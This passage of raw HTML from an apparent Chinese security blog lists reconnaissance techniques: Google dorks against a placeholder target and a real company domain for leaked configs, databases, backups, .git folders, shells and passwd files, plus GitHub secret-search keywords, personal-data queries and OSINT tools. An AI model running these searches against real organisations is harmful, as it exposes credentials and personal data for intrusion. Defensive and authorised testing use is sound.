href=\"#URL-跳转\" class=\"headerlink\" title=\"URL 跳转\"></a>URL 跳转</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">site:target.com inurl:url= | inurl:return= | inurl:next= | inurl:redir= inurl:http</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"SQL错误\"><a href=\"#SQL错误\" class=\"headerlink\" title=\"SQL错误\"></a>SQL错误</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">site:target.com intext:&quot;sql syntax near&quot; | intext:&quot;syntax error has occurred&quot; | intext:&quot;incorrect syntax near&quot; | intext:&quot;unexpected end of SQL command&quot; | intext:&quot;Warning: mysql_connect()&quot; | intext:”Warning: mysql_query()&quot; | intext:&quot;Warning: pg_connect()&quot;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"phpinfo\"><a href=\"#phpinfo\" class=\"headerlink\" title=\"phpinfo\"></a>phpinfo</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">site:target.com ext:php intitle:phpinfo &quot;published by the PHP Group&quot;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"配置文件泄露\"><a href=\"#配置文件泄露\" class=\"headerlink\" title=\"配置文件泄露\"></a>配置文件泄露</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">site:target.com ext:.xml | .conf | .cnf | .reg | .inf | .rdp | .cfg | .txt | .ora | .ini</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"数据库文件泄露\"><a href=\"#数据库文件泄露\" class=\"headerlink\" title=\"数据库文件泄露\"></a>数据库文件泄露</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">site:target.com ext:.sql | .dbf | .mdb | .db</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"日志文件泄露\"><a href=\"#日志文件泄露\" class=\"headerlink\" title=\"日志文件泄露\"></a>日志文件泄露</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">site:target.com ext:.log</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"备份和历史文件泄露\"><a href=\"#备份和历史文件泄露\" class=\"headerlink\" title=\"备份和历史文件泄露\"></a>备份和历史文件泄露</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">site:target.com ext:.bkf | .bkp | .old | .backup | .bak | .swp | .rar | .txt | .zip | .7z | .sql | .tar.gz | .tgz | .tar</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"公开文件泄露\"><a href=\"#公开文件泄露\" class=\"headerlink\" title=\"公开文件泄露\"></a>公开文件泄露</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">site:target.com filetype:.doc | .docx | .xls | .xlsx | .ppt | .pptx | .odt | .pdf | .rtf | .sxw | .psw | .csv</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"邮箱信息\"><a href=\"#邮箱信息\" class=\"headerlink\" title=\"邮箱信息\"></a>邮箱信息</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">site:target.com intext:@target.com</span><br><span class=\"line\">site:target.com 邮件</span><br><span class=\"line\">site:target.com email</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"社工信息\"><a href=\"#社工信息\" class=\"headerlink\" title=\"社工信息\"></a>社工信息</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">site:target.com intitle:账号 | 密码 | 工号 | 学号 | 身份证</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Dorks\"><a href=\"#Dorks\" class=\"headerlink\" title=\"Dorks\"></a>Dorks</h3><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Code share sites</span></span><br><span class=\"line\">site:http://ideone.com | site:http://codebeautify.org | site:http://codeshare.io | site:http://codepen.io | site:http://repl.it | site:http://jsfiddle.net &quot;company&quot;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">GitLab/GitHub/Bitbucket</span></span><br><span class=\"line\">site:github.com | site:gitlab.com | site:bitbucket.org &quot;company&quot;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Stackoverflow</span></span><br><span class=\"line\">site:stackoverflow.com &quot;target.com&quot;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Project management sites</span></span><br><span class=\"line\">site:http://trello.com | site:*.atlassian.net &quot;company&quot;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Pastebin-like sites</span></span><br><span class=\"line\">site:http://justpaste.it | site:http://pastebin.com &quot;company&quot;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Config files</span></span><br><span class=\"line\">site:target.com ext:xml | ext:conf | ext:cnf | ext:reg | ext:inf | ext:rdp | ext:cfg | ext:txt | ext:ora | ext:env | ext:ini</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Database files</span></span><br><span class=\"line\">site:target.com ext:sql | ext:dbf | ext:mdb</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Backup files</span></span><br><span class=\"line\">site:target.com ext:bkf | ext:bkp | ext:bak | ext:old | ext:backup</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">.git folder</span></span><br><span class=\"line\">inurl:&quot;/.git&quot; target.com -github</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Exposed documents</span></span><br><span class=\"line\">site:target.com ext:doc | ext:docx | ext:odt | ext:pdf | ext:rtf | ext:sxw | ext:psw | ext:ppt | ext:pptx | ext:pps | ext:csv</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Other files</span></span><br><span class=\"line\">site:target.com intitle:index.of | ext:log | ext:php intitle:phpinfo &quot;published by the PHP Group&quot; | inurl:shell | inurl:backdoor | inurl:wso | inurl:cmd | shadow | passwd | boot.ini | inurl:backdoor | inurl:readme | inurl:license | inurl:install | inurl:setup | inurl:config | inurl:&quot;/phpinfo.php&quot; | inurl:&quot;.htaccess&quot; | ext:swf</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">SQL errors</span></span><br><span class=\"line\">site:target.com intext:&quot;sql syntax near&quot; | intext:&quot;syntax error has occurred&quot; | intext:&quot;incorrect syntax near&quot; | intext:&quot;unexpected end of SQL command&quot; | intext:&quot;Warning: mysql_connect()&quot; | intext:&quot;Warning: mysql_query()&quot; | intext:&quot;Warning: pg_connect()&quot;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">PHP errors</span></span><br><span class=\"line\">site:target.com &quot;PHP Parse error&quot; | &quot;PHP Warning&quot; | &quot;PHP Error&quot;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Login pages</span></span><br><span class=\"line\">site:target.com inurl:signup | inurl:register | intitle:Signup</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Open redirects</span></span><br><span class=\"line\">site:target.com inurl:redir | inurl:url | inurl:redirect | inurl:return | inurl:src=http | inurl:r=http</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Apache Struts RCE</span></span><br><span class=\"line\">site:target.com ext:action | ext:struts | ext:do</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Search <span class=\"keyword\">in</span> pastebin</span></span><br><span class=\"line\">site:pastebin.com target.com</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Linkedin employees</span></span><br><span class=\"line\">site:linkedin.com employees target.com</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Wordpress files</span></span><br><span class=\"line\">site:target.com inurl:wp-content | inurl:wp-includes</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Subdomains</span></span><br><span class=\"line\">site:*.target.com</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Sub-subdomains</span></span><br><span class=\"line\">site:*.*.target.com</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">Find S3 Buckets</span></span><br><span class=\"line\">site:.s3.amazonaws.com | site:http://storage.googleapis.com | site:http://amazonaws.com &quot;target&quot;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Traefik</span></span><br><span class=\"line\">intitle:traefik inurl:8080/dashboard &quot;target&quot;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Jenkins</span></span><br><span class=\"line\">intitle:&quot;Dashboard [Jenkins]&quot;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Other 3rd parties sites</span></span><br><span class=\"line\">https://www.google.com/search?q=site%3Agitter.im%20%7C%20site%3Apapaly.com%20%7C%20site%3Aproductforums.google.com%20%7C%20site%3Acoggle.it%20%7C%20site%3Areplt.it%20%7C%20site%3Aycombinator.com%20%7C%20site%3Alibraries.io%20%7C%20site%3Anpm.runkit.com%20%7C%20site%3Anpmjs.com%20%7C%20site%3Ascribd.com%20%22united%22</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Backup files</span></span><br><span class=\"line\">https://www.google.com/search?q=site%3Aunited.com%20ext%3Abkf%20%7C%20ext%3Abkp%20%7C%20ext%3Abak%20%7C%20ext%3Aold%20%7C%20ext%3Abackup</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Login pages</span></span><br><span class=\"line\">https://www.google.com/search?q=site%3Aunited.com%20inurl%3Asignup%20%7C%20inurl%3Aregister%20%7C%20intitle%3ASignup</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Config files</span></span><br><span class=\"line\">https://www.google.com/search?q=site%3Aunited.com%20ext%3Axml%20%7C%20ext%3Aconf%20%7C%20ext%3Acnf%20%7C%20ext%3Areg%20%7C%20ext%3Ainf%20%7C%20ext%3Ardp%20%7C%20ext%3Acfg%20%7C%20ext%3Atxt%20%7C%20ext%3Aora%20%7C%20ext%3Aenv%20%7C%20ext%3Aini</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">.git folder</span></span><br><span class=\"line\">https://www.google.com/search?q=inurl%3A%5C%22%2F.git%5C%22%20united.com%20-github</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Database files</span></span><br><span class=\"line\">https://www.google.com/search?q=site%3Aunited.com%20ext%3Asql%20%7C%20ext%3Adbf%20%7C%20ext%3Amdb</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Open redirects</span></span><br><span class=\"line\">https://www.google.com/search?q=site%3Aunited.com%20inurl%3Aredir%20%7C%20inurl%3Aurl%20%7C%20inurl%3Aredirect%20%7C%20inurl%3Areturn%20%7C%20inurl%3Asrc%3Dhttp%20%7C%20inurl%3Ar%3Dhttp</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Code share sites</span></span><br><span class=\"line\">https://www.google.com/search?q=site%3Asharecode.io%20%7C%20site%3Acontrolc.com%20%7C%20site%3Acodepad.co%20%7Csite%3Aideone.com%20%7C%20site%3Acodebeautify.org%20%7C%20site%3Ajsdelivr.com%20%7C%20site%3Acodeshare.io%20%7C%20site%3Acodepen.io%20%7C%20site%3Arepl.it%20%7C%20site%3Ajsfiddle.net%20%22united%22</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Pastebin-like sites</span></span><br><span class=\"line\">https://www.google.com/search?q=site%3Ajustpaste.it%20%7C%20site%3Aheypasteit.com%20%7C%20site%3Apastebin.com%20%22united%22</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Linkedin employees</span></span><br><span class=\"line\">https://www.google.com/search?q=site%3Alinkedin.com%20employees%20united.com</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">Project management sites</span></span><br><span class=\"line\">https://www.google.com/search?q=site%3Atrello.com%20%7C%20site%3A*.atlassian.net%20%22united%22</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Other files</span></span><br><span class=\"line\">https://www.google.com/search?q=site%3Aunited.com%20intitle%3Aindex.of%20%7C%20ext%3Alog%20%7C%20ext%3Aphp%20intitle%3Aphpinfo%20%5C%22published%20by%20the%20PHP%20Group%5C%22%20%7C%20inurl%3Ashell%20%7C%20inurl%3Abackdoor%20%7C%20inurl%3Awso%20%7C%20inurl%3Acmd%20%7C%20shadow%20%7C%20passwd%20%7C%20boot.ini%20%7C%20inurl%3Abackdoor%20%7C%20inurl%3Areadme%20%7C%20inurl%3Alicense%20%7C%20inurl%3Ainstall%20%7C%20inurl%3Asetup%20%7C%20inurl%3Aconfig%20%7C%20inurl%3A%5C%22%2Fphpinfo.php%5C%22%20%7C%20inurl%3A%5C%22.htaccess%5C%22%20%7C%20ext%3Aswf</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Sub-subdomains</span></span><br><span class=\"line\">https://www.google.com/search?q=site%3A*.*.united.com</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Jenkins</span></span><br><span class=\"line\">https://www.google.com/search?q=intitle%3A%5C%22Dashboard%20%5BJenkins%5D%5C%22%20%22united%22</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Traefik</span></span><br><span class=\"line\">https://www.google.com/search?q=intitle%3Atraefik%20inurl%3A8080%2Fdashboard%20%22united%22</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Cloud buckets S3/GCP</span></span><br><span class=\"line\">https://www.google.com/search?q=site%3A.s3.amazonaws.com%20%7C%20site%3Astorage.googleapis.com%20%7C%20site%3Aamazonaws.com%20%22united%22</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">SQL errors</span></span><br><span class=\"line\">https://www.google.com/search?q=site%3Aunited.com%20intext%3A%5C%22sql%20syntax%20near%5C%22%20%7C%20intext%3A%5C%22syntax%20error%20has%20occurred%5C%22%20%7C%20intext%3A%5C%22incorrect%20syntax%20near%5C%22%20%7C%20intext%3A%5C%22unexpected%20end%20of%20SQL%20command%5C%22%20%7C%20intext%3A%5C%22Warning%3A%20mysql_connect()%5C%22%20%7C%20intext%3A%5C%22Warning%3A%20mysql_query()%5C%22%20%7C%20intext%3A%5C%22Warning%3A%20pg_connect()%5C%22</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Exposed documents</span></span><br><span class=\"line\">https://www.google.com/search?q=site%3Aunited.com%20ext%3Adoc%20%7C%20ext%3Adocx%20%7C%20ext%3Aodt%20%7C%20ext%3Apdf%20%7C%20ext%3Artf%20%7C%20ext%3Asxw%20%7C%20ext%3Apsw%20%7C%20ext%3Appt%20%7C%20ext%3Apptx%20%7C%20ext%3Apps%20%7C%20ext%3Acsv</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Wordpress files</span></span><br><span class=\"line\">https://www.google.com/search?q=site%3Aunited.com%20inurl%3Awp-content%20%7C%20inurl%3Awp-includes</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Apache Struts RCE</span></span><br><span class=\"line\">https://www.google.com/search?q=site%3Aunited.com%20ext%3Aaction%20%7C%20ext%3Astruts%20%7C%20ext%3Ado</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">GitLab/GitHub/Bitbucket</span></span><br><span class=\"line\">https://www.google.com/search?q=site%3Agithub.com%20%7C%20site%3Agitlab.com%20%7C%20site%3Abitbucket.org%20%22united%22</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Subdomains</span></span><br><span class=\"line\">https://www.google.com/search?q=site%3A*.united.com</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Stackoverflow</span></span><br><span class=\"line\">https://www.google.com/search?q=site%3Astackoverflow.com%20%22united.com%22</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">PHP errors</span></span><br><span class=\"line\">https://www.google.com/search?q=site%3Aunited.com%20%5C%22PHP%20Parse%20error%5C%22%20%7C%20%5C%22PHP%20Warning%5C%22%20%7C%20%5C%22PHP%20Error%5C%22</span><br></pre></td></tr></table></figure>\n<h2 id=\"Github\"><a href=\"#Github\" class=\"headerlink\" title=\"Github\"></a>Github</h2><ul>\n<li>Github高级搜索：<a href=\"https://github.com/search/advanced\">https://github.com/search/advanced</a></li>\n<li>GitDorker：<a href=\"https://github.com/obheda12/GitDorker\">https://github.com/obheda12/GitDorker</a></li>\n<li>gitdorks_go：<a href=\"https://github.com/damit5/gitdorks_go\">https://github.com/damit5/gitdorks_go</a></li>\n</ul>\n<p>keywords：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&quot;token&quot;</span><br><span class=\"line\">&quot;password&quot;</span><br><span class=\"line\">&quot;secret&quot;</span><br><span class=\"line\">&quot;passwd&quot;</span><br><span class=\"line\">&quot;username&quot;</span><br><span class=\"line\">&quot;key&quot;</span><br><span class=\"line\">&quot;apidocs&quot;</span><br><span class=\"line\">&quot;appspot&quot;</span><br><span class=\"line\">&quot;auth&quot;</span><br><span class=\"line\">&quot;aws_access&quot;</span><br><span class=\"line\">&quot;config&quot;</span><br><span class=\"line\">&quot;credentials&quot;</span><br><span class=\"line\">&quot;dbuser&quot;</span><br><span class=\"line\">&quot;ftp&quot;</span><br><span class=\"line\">&quot;login&quot;</span><br><span class=\"line\">&quot;mailchimp&quot;</span><br><span class=\"line\">&quot;mailgun&quot;</span><br><span class=\"line\">&quot;mysql&quot;</span><br><span class=\"line\">&quot;pass&quot;</span><br><span class=\"line\">&quot;pem private&quot;</span><br><span class=\"line\">&quot;prod&quot;</span><br><span class=\"line\">&quot;pwd&quot;</span><br><span class=\"line\">&quot;secure&quot;</span><br><span class=\"line\">&quot;ssh&quot;</span><br><span class=\"line\">&quot;staging&quot;</span><br><span class=\"line\">&quot;stg&quot;</span><br><span class=\"line\">&quot;stripe&quot;</span><br><span class=\"line\">&quot;swagger&quot;</span><br><span class=\"line\">&quot;testuser&quot;</span><br><span class=\"line\">&quot;jdbc&quot;</span><br></pre></td></tr></table></figure>\n\n<p>除了 Github 外，还有一些其他的代码平台：</p>\n<ul>\n<li>GitLab: <a href=\"https://about.gitlab.com/\">https://about.gitlab.com/</a></li>\n<li>Gitee: <a href=\"https://gitee.com/\">https://gitee.com/</a></li>\n<li>Bitbucket: <a href=\"https://bitbucket.org/\">https://bitbucket.org/</a></li>\n</ul>\n<h2 id=\"Stack-Overflow\"><a href=\"#Stack-Overflow\" class=\"headerlink\" title=\"Stack Overflow\"></a>Stack Overflow</h2><p>Stackoverflow：<a href=\"https://stackoverflow.com/\">https://stackoverflow.com/</a></p>\n<p>Stack Overflow 日志：</p>\n<ul>\n<li><a href=\"https://archive.org/details/stackexchange\">https://archive.org/details/stackexchange</a></li>\n<li><a href=\"https://archive.org/download/stackexchange\">https://archive.org/download/stackexchange</a></li>\n</ul>\n<p>敏感信息可能包括：</p>\n<ul>\n<li>github key</li>\n<li>简历&#x2F;邮箱&#x2F;手机号</li>\n</ul>\n<h2 id=\"社交平台\"><a href=\"#社交平台\" class=\"headerlink\" title=\"社交平台\"></a>社交平台</h2><p>结合 Google Search</p>\n<ul>\n<li>语雀：<a href=\"https://www.yuque.com/dashboard\">https://www.yuque.com/dashboard</a></li>\n<li>印象识堂：<a href=\"https://www.yinxiang.com/everhub/\">https://www.yinxiang.com/everhub/</a></li>\n<li>wolai：<a href=\"https://www.wolai.com/\">https://www.wolai.com/</a></li>\n<li>腾讯文档：<a href=\"https://docs.qq.com/\">https://docs.qq.com</a></li>\n<li>飞书文档：<a href=\"https://docs.feishu.cn/\">https://docs.feishu.cn</a></li>\n<li>蓝湖：<a href=\"https://lanhuapp.com/\">https://lanhuapp.com/</a></li>\n</ul>\n<h2 id=\"历史页面\"><a href=\"#历史页面\" class=\"headerlink\" title=\"历史页面\"></a>历史页面</h2><ul>\n<li>Wayback Machine：<a href=\"https://archive.org/web\">https://archive.org/web</a></li>\n<li>waybackurls：<a href=\"https://github.com/tomnomnom/waybackurls\">https://github.com/tomnomnom/waybackurls</a></li>\n<li>gau：<a href=\"https://github.com/lc/gau\">https://github.com/lc/gau</a></li>\n</ul>\n<h2 id=\"网盘\"><a href=\"#网盘\" class=\"headerlink\" title=\"网盘\"></a>网盘</h2><ul>\n<li>搜索导航：e.g. <a href=\"https://adzhp.xyz/sites/3983.html\">https://adzhp.xyz/sites/3983.html</a></li>\n<li>聚合搜索：e.g. <a href=\"https://www.chaonengsou.com/\">https://www.chaonengsou.com/</a></li>\n<li>蓝奏云：<a href=\"https://www.lanzoux.com/\">https://www.lanzoux.com</a></li>\n<li>天翼云：<a href=\"https://www.ctyun.cn/\">https://www.ctyun.cn</a></li>\n<li>阿里云盘：<a href=\"https://www.aliyundrive.com/\">https://www.aliyundrive.com</a></li>\n<li>城通网盘：<a 